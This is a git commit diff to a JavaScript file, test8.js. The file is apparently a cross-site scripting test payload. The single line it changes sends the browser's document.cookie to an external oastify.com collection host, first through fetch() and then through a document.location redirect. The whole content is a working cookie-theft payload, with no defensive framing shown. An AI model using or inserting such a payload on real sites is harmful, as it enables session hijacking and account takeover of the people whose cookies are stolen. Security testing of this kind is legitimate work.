094e3ad9cde85fef0fb69b261b0eba6954e28a61
VidSovic <61434487+VidSovic@users.noreply.github.com>
2023-07-08 12:50:56 +0200

    Update test8.js

--- test8.js
+++ test8.js
@@ -1,1 +1,1 @@
-fetch("http://bo3k7i5yzm0g2lamnxqhajpdz45vtlha.oastify.com/test?c="+document.cookie);
+document.location=("http://bo3k7i5yzm0g2lamnxqhajpdz45vtlha.oastify.com/test?c="+document.cookie);
